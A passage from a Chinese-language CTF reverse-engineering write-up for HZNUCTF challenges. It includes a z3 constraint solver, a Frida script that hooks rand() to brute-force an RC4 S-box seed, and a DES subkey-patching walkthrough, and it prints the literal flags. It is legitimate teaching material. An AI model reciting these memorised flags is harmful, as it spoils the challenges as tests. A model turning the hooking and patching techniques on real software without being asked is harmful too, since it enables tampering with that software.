class="hljs-number">4</span>]) + <span class="hljs-number">499</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] - <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">610</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">221</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">23</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">102</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">6</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2050</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">406</span> * enc[<span class="hljs-number">15</span>]) + <span class="hljs-number">665</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">201</span> * enc[<span class="hljs-number">21</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">22</span>] == <span class="hljs-number">111844</span>)<br>s.add((((((((<span class="hljs-number">1</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4444</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">5555</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">676</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">660</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">73</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">107</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">6</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">15</span>]) + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">201</span> * enc[<span class="hljs-number">21</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">22</span>]) + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] == <span class="hljs-number">159029</span>)<br>s.add((((<span class="hljs-number">520</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">222</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56655</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">73</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">1007</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">7777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2500</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">605</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">390</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">99999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">210</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] == <span class="hljs-number">2762025</span>)<br>s.add(((((<span class="hljs-number">1323</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">666</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">660</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2500</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">605</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">390</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">9999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">210</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>]) + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] == <span class="hljs-number">1551621</span>)<br>s.add((((((<span class="hljs-number">777</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">6969</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">666</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>]) + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>] == <span class="hljs-number">948348</span>)<br>s.add(((((((<span class="hljs-number">97</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">6969</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">96</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>]) + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>]) + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] == <span class="hljs-number">777044</span>)<br>s.add((((((<span class="hljs-number">177</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">699</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">64</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">96</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">222</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">224</span> * enc[<span class="hljs-number">24</span>]) + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>]) + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] - <span class="hljs-number">28</span> * enc[<span class="hljs-number">28</span>] == <span class="hljs-number">185016</span>)<br>s.add(((((((<span class="hljs-number">77</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">6</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">96</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">9</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">0</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">222</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">224</span> * enc[<span class="hljs-number">24</span>]) + <span class="hljs-number">26</span> * enc[<span class="hljs-number">25</span>] - -<span class="hljs-number">58</span> * enc[<span class="hljs-number">26</span>]) + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">28</span>]) + <span class="hljs-number">29</span> * enc[<span class="hljs-number">29</span>] == <span class="hljs-number">130106</span>)<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> enc:<br>    s.add(x &gt;= <span class="hljs-number">32</span>)<br>    s.add(x &lt;= <span class="hljs-number">126</span>)<br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br><br>    solution = [m[x].as_long() <span class="hljs-keyword">if</span> m[x] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> enc]<br>    <br>    decrypted = decrypt(solution)<br>    <span class="hljs-built_in">print</span>(decrypted)<br>    <br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution found&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到flag<code>HZNUCTF&#123;ad7fa-76a7-ff6a-fffa-7f7d6a&#125;</code></p><h3 id="conforand"><a href="#conforand" class="headerlink" title="conforand"></a>conforand</h3><ol><li>直接用 ida 打开发现有 ollvm 混淆，用 <code>D-810</code> 先去混淆，从给出的符号表看到是 rc4 加密</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">v4 = <span class="hljs-built_in">rc4</span>(v127, <span class="hljs-number">42LL</span>, v125, <span class="hljs-number">9LL</span>);<br></code></pre></td></tr></table></figure><p>看传入的每个参数分别代表什么，往上看<br><img src="/../images/7/con2.png"><br><img src="/../images/7/con3.png"><br>大致为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rc4</span><span class="hljs-params">(<span class="hljs-type">void</span>* data, <span class="hljs-type">int</span> data_length, <span class="hljs-type">void</span>* key, <span class="hljs-type">int</span> key_length)</span></span>;<br></code></pre></td></tr></table></figure><p>密文长度为42个字节，密钥长度为9字节，即<code>JustDoIt!</code><br>2. 在<code>init</code>中的<code>sub_5s5s5s</code>里初始化随机数种子并传入密钥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*v84 = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br><span class="hljs-built_in">srand</span>(seed);<br></code></pre></td></tr></table></figure><p>在<code>init_sbox</code>中调用<code>rand()</code>函数，种子不确定，rand()也只调用了这一次<br><strong>rc4</strong> 算法中包含一个 S 盒，是一个含有 256 个元素的数组，其中的每个元素都是一个 8 位无符号整数，即 0-255 范围内的值，rand（）函数被用来影响 S 盒的初始化过程，hook rand（）函数尝试爆破</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lib=<span class="hljs-title class_">Process</span>.<span class="hljs-title function_">getModuleByName</span>(<span class="hljs-string">&quot;conforand&quot;</span>);<br><span class="hljs-keyword">var</span> sym=lib.<span class="hljs-title function_">enumerateSymbols</span>();<br><span class="hljs-comment">//返回&quot;conforand&quot;模块中所有的导出符号(函数、变量)的数组</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;sym.<span class="hljs-property">length</span>;i++)&#123;<br>    <span class="hljs-comment">//打印函数符号表</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sym[i].<span class="hljs-property">name</span>);<br>&#125;<br><span class="hljs-keyword">var</span> randptr=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>,<span class="hljs-string">&quot;rand&quot;</span>);<br><span class="hljs-comment">//查找 lib.so.6 中 rand() 函数的内存地址</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;randptr:&quot;</span>+randptr);<br><br><span class="hljs-keyword">var</span> rc4ptr=lib.<span class="hljs-title function_">findSymbolByName</span>(<span class="hljs-string">&quot;rc4&quot;</span>);<br><br><span class="hljs-comment">//将原生函数封装成 JavaScript 可调用函数</span><br><span class="hljs-keyword">var</span> rand=<span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(randptr,<span class="hljs-string">&#x27;int&#x27;</span>,[]);<br><span class="hljs-keyword">var</span> rc4=<span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(rc4ptr,<span class="hljs-string">&#x27;int&#x27;</span>,[<span class="hljs-string">&#x27;pointer&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;pointer&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>]); <br><span class="hljs-keyword">var</span> rc4key=<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">9</span>);<br>rc4key.<span class="hljs-title function_">writeUtf8String</span>(<span class="hljs-string">&quot;JustDoIt!&quot;</span>);<br><span class="hljs-comment">//爆破rand（）函数返回值</span><br><span class="hljs-keyword">let</span> randRet=<span class="hljs-number">0</span>;<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(randptr,&#123;<br>    <span class="hljs-comment">//在每次rand（）函数执行完，将原本的返回值替换成爆破值（randRet）</span><br>    <span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br>        retval.<span class="hljs-title function_">replace</span>(randRet);<br>    &#125;<br>&#125;)<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>    randRet=i;<br>    <span class="hljs-keyword">var</span> input=<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">42</span>);<br>    <span class="hljs-comment">//密文 output.txt</span><br>    input.<span class="hljs-title function_">writeByteArray</span>([<span class="hljs-number">0x83</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x88</span>,<br>        <span class="hljs-number">0x36</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x0f</span>,<br>        <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x8d</span>,<br>        <span class="hljs-number">0x51</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x83</span>,<br>        <span class="hljs-number">0x56</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6e</span>,<br>        <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x2f</span>]);<br>    <span class="hljs-title function_">rc4</span>(input,<span class="hljs-number">42</span>,rc4key,<span class="hljs-number">9</span>);<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(input.<span class="hljs-title function_">readUtf8String</span>(<span class="hljs-number">41</span>));<br>    &#125;<span class="hljs-keyword">catch</span>(e)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;error:&quot;</span>+e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>在linux环境运行 开虚拟环境装frida</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hook.js&#x27;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<span class="hljs-keyword">as</span> f:<br>    jscode= f.read()<br><br><span class="hljs-comment">#目标程序路径为当前目录下的 &quot;conforand&quot; 可执行文件</span><br>targetProcessPackName=<span class="hljs-string">&quot;../conforand&quot;</span><br>device=frida.get_local_device()<br><br><span class="hljs-comment">#启动并附加到目标进程</span><br><span class="hljs-keyword">try</span>:<br>    pid=device.spawn([targetProcessPackName])<br>    session=device.attach(pid)<br>    <span class="hljs-built_in">print</span>(pid)<br><span class="hljs-keyword">except</span> frida.ProcessNotFoundError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No such process&quot;</span>)<br>    sys.exit(<span class="hljs-number">0</span>)<br>device.resume(pid)<span class="hljs-comment">#恢复目标进程</span><br>time.sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#准备将 JavaScript 代码转换为可注入的脚本对象</span><br>script=session.create_script(jscode)<br><span class="hljs-comment"># script.on(&#x27;message&#x27;,onMassage)</span><br>script.load()<span class="hljs-comment">#执行注入</span><br>sys.stdin.read()<br></code></pre></td></tr></table></figure><p><img src="/../images/7/con4.png"><br><img src="/../images/7/con5.png"><br>得到flag<code>HZNUCTF&#123;489b88-1305-411e-b1f4-88a3070a73&#125;</code></p><h3 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h3><ol><li><p>直接扔 ida 发现有壳，upx 工具去壳之后再打开，直接看没看出加密类型，用<code>Findcrypt</code>插件找到一个<strong>DES_sbox</strong>,基本确定是 DES 加密，x 交叉引用能一直跳到主函数那里<br><img src="/../images/7/ex1.png"><br>Source 必须有至少 41 字节，否则 Source + 40 会越界访问，输入的flag形式必须是HZNUCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx},中间部分长度为32个字节，否则程序会退出</p></li><li><p>第一个 for 循环对输入的{}中的字符进行处理，处理的结果存入 v12<br><img src="/../images/7/ex2.png"><br>进入加密部分<br><img src="/../images/7/ex3.png"></p></li><li><p>由于 DES 的密钥是在加密前初始化好的，在 input 第一次传入前的函数动用处打断点，动调找密钥<br><img src="/../images/7/ex5.png"><br><img src="/../images/7/ex6.png"><br>把 key 形式改 Q_word(64位) ,并且 Array size 改成32之后，能明显看到前后对称，而DES 的解密方式是16个子密钥倒着使用，于是直接修改寄存器(RCX)值，在原来的基础上加128(16*8),接着把密文 patch 到 input 里，直接运行解密<br><img src="/../images/7/ex4.png"></p></li><li><p>找到解密后的字符，导出为 hex string(unspaced),<br>最后解密</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v12</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(v12), <span class="hljs-number">4</span>):<br>        block = v12[i:i+<span class="hljs-number">4</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(block) &lt; <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 防止异常</span><br>        <span class="hljs-comment"># 交换回去：2、3位交换</span><br>        block = block[<span class="hljs-number">0</span>] + block[<span class="hljs-number">2</span>] + block[<span class="hljs-number">1</span>] + block[<span class="hljs-number">3</span>]<br>        <br>        <span class="hljs-comment"># 拆成两部分</span><br>        hex1 = block[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>        hex2 = block[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]<br>        <br>        <span class="hljs-comment"># 转成字符</span><br>        char1 = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex1, <span class="hljs-number">16</span>))<br>        char2 = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex2, <span class="hljs-number">16</span>))<br>        <br>        result += char1 + char2<br>    <span class="hljs-keyword">return</span> result<br><br><br>v12 = <span class="hljs-string">&quot;333936147332632923d96353321d3345636826d26314621d3349330463126348&quot;</span> <br>flag_middle = decrypt(v12)<br><br><span class="hljs-comment"># 组装完整flag</span><br>flag = <span class="hljs-string">&quot;HZNUCTF&#123;&quot;</span> + flag_middle + <span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># 